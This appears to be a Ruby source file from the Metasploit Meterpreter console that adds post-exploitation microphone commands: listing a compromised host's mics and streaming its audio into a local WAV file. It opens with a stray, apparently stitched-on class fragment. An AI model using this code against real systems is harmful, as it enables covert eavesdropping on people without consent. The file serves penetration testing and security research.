class Mic
end# -*- coding: binary -*-
require 'rex/post/meterpreter'
require 'bindata'

module Rex
  module Post
    module Meterpreter
      module Ui

        ###
        #
        # Mic - Capture audio from the remote system
        #
        ###
        class Console::CommandDispatcher::Stdapi::Mic
          Klass = Console::CommandDispatcher::Stdapi::Mic

          include Console::CommandDispatcher

          #
          # List of supported commands.
          #
          def commands
            {
                'mic_start'             => 'play an audio stream from the specified mic',
                'mic_stop'              => 'stop capturing audio from device',
                'mic_list' => 'list all audio interfaces',
                'listen'                => 'listen to audio via audio player'
            }
          end

          #
          # Name for this dispatcher
          #
          def name
            "Stdapi: Mic"
          end

          def cmd_mic_list
            client.mic.mic_list
            if client.mic.mic_list.length == 0
              print_error("No mics were found")
              return
            end

            client.mic.mic_list.each_with_index do |name, indx|
              print_line("#{indx + 1}: #{name}")
            end
          end

          def audio_file_wave_header(sample_rate_hz, num_channels, bits_per_sample, data_size)
            subchunk1_size = 16
            chunk_size = 4 + (8 + subchunk1_size) + (8 + data_size)
            byte_rate = sample_rate_hz * num_channels * bits_per_sample / 8
            block_align = num_channels * bits_per_sample / 8

            [
              BinData::Int32be.new(0x52494646),      # ChunkID: "RIFF"
              BinData::Int32le.new(chunk_size),      # ChunkSize
              BinData::Int32be.new(0x57415645),      # Format: "WAVE"
              BinData::Int32be.new(0x666d7420),      # SubChunk1ID: "fmt "
              BinData::Int32le.new(16),              # SubChunk1Size
              BinData::Int16le.new(1),               # AudioFormat
              BinData::Int16le.new(num_channels),    # NumChannels
              BinData::Int32le.new(sample_rate_hz),  # SampleRate
              BinData::Int32le.new(byte_rate),       # ByteRate
              BinData::Int16le.new(block_align),     # BlockAlign
              BinData::Int16le.new(bits_per_sample), # BitsPerSample
              BinData::Int32be.new(0x64617461),      # SubChunk2ID: "data"
              BinData::Int32le.new(data_size)        # SubChunk2Size
            ]
          end

          def cmd_mic_start(start_delay=4096)
            print_status("Streaming mic audio channel...")

            if client.mic.mic_list.length == 0
              print_error("Target does not have a mic")
              return
            end

            print_status("Starting...")
            stream_path = Rex::Text.rand_text_alpha(8) + ".wav"
            duration = 1800
            quality  = 50

            print_status("Audio File: #{stream_path}")
            print_status("Streaming...")

            begin
              channel = client.mic.mic_start
              mic_started = true
              ::Timeout.timeout(duration) do
                ::File.open(stream_path, 'wb') do |outfd|
                  audio_file_wave_header(11025, 1, 16, 2000000000).each { |e| e.write(outfd) }
                end
                stream_index = 0
                while client do
                  if stream_index == start_delay
                    cmd_listen(stream_path)
                  end
                  Rex::sleep(0.5)
                  #data = client.mic.mic_get_frame(quality)
                  data = channel.read(65536)
                  if data
                    ::File.open(stream_path, 'a') do |f|
                      f.write(data)
                    end
                    data = nil
                  end
                  stream_index += 1
                end
              end
            rescue ::Timeout::Error
            ensure
              client.mic.mic_stop if mic_started
            end
          end

          def cmd_listen(stream_path)
            Rex::Compat.open_webrtc_browser("file://#{::File.absolute_path(stream_path)}")
          end

          def cmd_mic_stop
            client.mic.mic_stop
          end
        end
      end
    end
  end
end
